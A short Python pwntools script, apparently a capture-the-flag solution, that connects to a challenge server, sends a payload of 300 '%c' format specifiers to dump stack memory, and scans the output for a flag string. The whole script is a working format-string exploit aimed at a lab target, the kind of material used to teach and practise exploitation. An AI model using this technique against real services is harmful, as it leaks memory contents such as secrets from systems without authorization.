#!/usr/bin/env python3
from pwn import *
import time

context.log_level = 'info'

r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)

r.recvuntil(b"Clue: ")
leak = r.recvline().strip()
log.info(f"Leaked: {leak}")

r.recvuntil(b"Write your path:")

# Use many %c to dump a lot of stack data
# The flag might be somewhere in the stack/memory
payload = b"%c" * 300
r.sendline(payload)

time.sleep(2)
response = r.recvall(timeout=2)

log.info(f"Response length: {len(response)}")

# Save and analyze
with open('big_dump.bin', 'wb') as f:
    f.write(response)

# Look for recognizable strings or patterns
print("\n=== Searching for interesting data ===")
if b"0xL4ugh{" in response:
    idx = response.find(b"0xL4ugh{")
    print(f"[!!!] Found flag at offset {idx}:")
    print(response[idx:idx+100])
else:
    # Print all printable strings longer than 4 chars
    current_string = b""
    for byte in response:
        if 32 <= byte < 127:
            current_string += bytes([byte])
        else:
            if len(current_string) > 4:
                print(f"String: {current_string}")
            current_string = b""

r.close()
